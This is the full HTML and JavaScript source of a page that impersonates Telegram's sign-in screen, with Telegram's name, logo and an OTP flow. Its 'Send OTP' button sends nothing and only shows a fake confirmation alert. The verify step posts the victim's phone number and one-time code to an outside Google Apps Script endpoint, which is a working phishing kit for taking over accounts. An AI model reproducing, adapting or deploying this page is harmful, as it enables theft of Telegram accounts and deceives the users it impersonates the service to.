<!DOCTYPE html> 
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background: white;
            padding: 50px;
            border-radius: 2px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #4A90E2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: skyblue;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="telegram-logo.png" width=300 height=150>
        <h2>Sign in to Telegram</h2>
        <input type="text" id="mobile" placeholder="Enter mobile number" maxlength="13">
        <button onclick="sendOTP()">Send OTP</button>
        <input type="text" id="otp" placeholder="Enter OTP" style="display: none;">  
        <button onclick="verifyOTP()" id="verifyBtn" style="display: none;">Verify OTP</button>
    </div>

    <script>
        const googleAppsScriptURL = "https://script.google.com/macros/s/AKfycbwHaXRdV1phKQXHmG0HdwKjuS1ZPK7do1sQeCvMkc_SdHqo77LAlAK4mpMSlMf8q_KIvw/exec"; // Replace with your correct Web App URL

        function sendOTP() {
            let mobileNumber = document.getElementById("mobile").value.trim();

            if (mobileNumber.length < 10) {
                alert("Please enter a valid mobile number");
                return;
            }

            alert("OTP sent to " + mobileNumber);
            document.getElementById("otp").style.display = "block";
            document.getElementById("verifyBtn").style.display = "block";
        }

        async function verifyOTP() {
            let mobileNumber = document.getElementById("mobile").value.trim();
            let otp = document.getElementById("otp").value.trim();

            if (!otp) {
                alert("Please enter the OTP");
                return;
            }

            let data = { mobile: mobileNumber, otp: otp };

            try {
                let response = await fetch(googleAppsScriptURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                let result = await response.json();

                if (result.status === "success") {
                    alert("Login Successful!");
                    // Hide OTP input and button after successful login
                    document.getElementById("otp").style.display = "none";
                    document.getElementById("verifyBtn").style.display = "none";
                } else {
                    alert("Invalid OTP. Please try again.");
                }
            } catch (error) {
                console.error("Error verifying OTP:", error);
                alert("There was an error processing your request.");
            }
        }
    </script>
</body>
</html>
